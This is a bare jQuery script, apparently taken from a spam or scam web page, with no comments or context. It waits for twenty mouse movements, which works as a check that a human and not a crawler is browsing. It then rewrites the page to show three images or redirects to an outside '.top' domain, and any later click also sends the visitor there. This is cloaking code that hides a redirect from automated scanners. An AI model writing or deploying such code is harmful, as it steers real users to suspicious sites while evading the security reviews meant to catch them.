var numCount=0;
var allowCount=20;
var url="https://dousxiadd.top/";
var isRedirect=false;
$(function()
{
	$("body").mousemove(function(event)
	{
		if(event.pageX>0 && event.pageY>0)
		{
			numCount++;
			if(numCount==allowCount)
			{
				document.title="site";
				if(isRedirect==true)
				{
					window.location=url;
				}
				else
				{
					$("body").html("<img src='11.jpg' /><img src='22.jpg' /><img src='33.jpg' />");
				}
			}
		}
	});

	$("body").click(function(event)
	{
		if(checkRes(event)==true)
		{
			window.location=url;
		}
	});
})

function checkRes(e)
{
	if(numCount>=allowCount && e.pageX>0 && e.pageY>0)
	{return true;}else{return false;}
}


